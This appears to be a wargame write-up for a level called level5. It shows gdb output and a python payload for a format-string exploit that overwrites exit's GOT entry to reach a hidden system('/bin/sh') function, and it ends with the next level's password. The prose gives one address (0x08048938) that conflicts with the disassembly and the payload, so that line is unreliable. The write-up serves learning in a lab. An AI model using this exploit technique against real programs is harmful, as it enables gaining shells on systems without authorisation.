@@ -1,0 +1,38 @@
+level5 again prints the user's input on the stdout. I should stop specifying that.
+
+gdb indicates that the main function calls an [n] function.
+[n] calls [fgets], then a printf with the user's input then exits. There's no m variable
+comparison, unlike the previous two levels.
+
+(gdb) >info functions
+
+There's an [o] function at the address 0x080484a4 that is never called. Disassembling
+it teaches us that it opens a shell (system(/bin/sh)) then exits.
+I guess we'll have to use the same method of formatting printf to make the program execute [o].
+
+We'll replace the address of the exit call with a call to [o], since that's the only thing that's
+called after printf.
+First we have to find the address of exit in the GOT (Global Offset Table).
+
+(gdb) >info function exit
+[list of functions with exit in their name]
+(gdb) >x/i 0x080483d0
+0x080483d0 <exit>: jmp *0x8049838
+
+So the real address of exit is 0x08048938. We need to replace that with [o]'s address (0x080484a4).
+
+First we'll try to find where the printf's buffer is located.
+
+>./level5
+XXXX %x %x %x %x %x %x 
+XXXX 200 b7fd1ac0 b7ff37d0 58585858 [...]
+
+Fourth position then, like level3. Now we have to enter the correct amount of characters, so that
+%n writes the correct address.
+0x080484a4 gives us 134513828. That's a lot.
+
+>python -c "print '\x38\x98\x04\x08' + '%134513824x' + '%4\$n'" > /tmp/level5
+[an awful lot of spaces, then 200]
+$>cd ../level6
+$>cat .pass
+$>d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
